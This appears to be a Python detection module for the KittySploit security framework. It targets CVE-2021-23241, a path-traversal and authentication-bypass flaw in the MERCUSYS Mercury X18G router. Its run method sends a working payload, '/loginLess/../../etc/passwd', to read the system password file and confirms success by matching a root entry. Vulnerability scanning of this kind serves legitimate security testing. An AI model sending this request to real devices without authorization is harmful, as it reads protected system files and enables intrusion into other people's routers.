#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MERCUSYS Mercury X18G 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MERCUSYS Mercury X18G 1.0.5 Router - Local File Inclusion Detection',
        'description': 'MERCUSYS Mercury X18G 1.0.5 devices are vulnerable to local file inclusion via ../ in conjunction with a loginLess or login.htm URI (for authentication bypass) to the web server, as demonstrated by the /loginLess/../../etc/passwd URI.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'iot', 'lfi', 'router', 'mercusys', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/BATTZION/MY_REQUEST/blob/master/Mercury%20Router%20Web%20Server%20Directory%20Traversal.md',
            'https://www.mercusys.com/en/',
            'https://www.mercurycom.com.cn/product-521-1.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-23241',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-23241',
    }

    def run(self):
        r = self.http_request(method="GET", path='/loginLess/../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="MERCUSYS Mercury X18G 1.0.5 Router - Local File Inclusion detected",
                path='/loginLess/../../etc/passwd',
            )
            return True
        return False

